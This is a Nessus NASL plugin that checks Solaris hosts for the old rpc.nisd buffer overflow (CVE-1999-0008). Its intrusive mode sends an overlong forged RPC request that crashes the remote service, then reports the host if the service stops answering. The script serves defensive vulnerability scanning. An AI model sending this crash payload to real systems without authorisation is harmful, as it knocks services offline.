#
# This script is released under the GPL
#

if(description)
{
 script_id(10251);
 script_bugtraq_id(104);
 script_version ("$Revision: 1.7 $");
 script_cve_id("CVE-1999-0008");
 
 name["english"] = "rpc.nisd overflow";
 
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote RPC service 100300 (nisd) is vulnerable
to a buffer overflow which allows any user to obtain a root
shell on this host.

Solution : disable this service if you don't use it, or apply the relevant patch
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "buffer overflow through rpc.nisd";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 if ( !defined_func("bn_random") ) 
 	script_dependencies("rpc_portmap.nasl");
 else
 	script_dependencies("rpc_portmap.nasl", "solaris26_105401.nasl", "solaris26_x86_105402.nasl");
 script_require_keys("rpc/portmap");
 
 exit(0);
}

include("misc_func.inc");

version = get_kb_item("Host/Solaris/Version");
if ( version && ereg(pattern:"^5\.([7-9]|10)", string:version)) exit(0);
if ( get_kb_item("BID-102") ) exit(0);

function ping()
{
 req =  raw_string(0x3A, 0x90, 0x9C, 0x2F, 0x00, 0x00,
    	0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01,
	0x87, 0xCC, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x04) + crap(4);
  soc = open_sock_udp(port);
  if(!soc)exit(0);
  send(socket:soc, data:req);
  r = recv(socket:soc, length:512);
  if(r) return 1;
  else return 0;
}

port = get_rpc_port(program:100300, protocol:IPPROTO_UDP);
if(port)
{
  if(safe_checks())
  {
  data = " 
The remote RPC service 100300 (nisd) *may* be vulnerable
to a buffer overflow which allows any user to obtain a root
shell on this host.

*** Nessus did not actually check for this flaw, so this 
*** might be a false positive

Solution : disable this service if you don't useit, or apply
the relevant patch
Risk factor : High";
  security_hole(port:port, data:data);
  exit(0);
  }
  
  
  if(get_udp_port_state(port))
  {
   if(ping())
   {
   soc = open_sock_udp(port);
   if(soc)
   {
    #
    # We forge a bogus RPC request, with a way too long
    # argument. The remote process will die immediately,
    # and hopefully painlessly.
    #
    req = raw_string(0x3A, 0x90, 0x9C, 0x2F, 0x00, 0x00,
    	0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01,
	0x87, 0xCC, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x09, 0x2C) + crap(3500);


     send(socket:soc, data:req);
     r = recv(socket:soc, length:4096);
     close(soc);
     
     if(!ping())security_hole(port);
   }
   }
 }
}
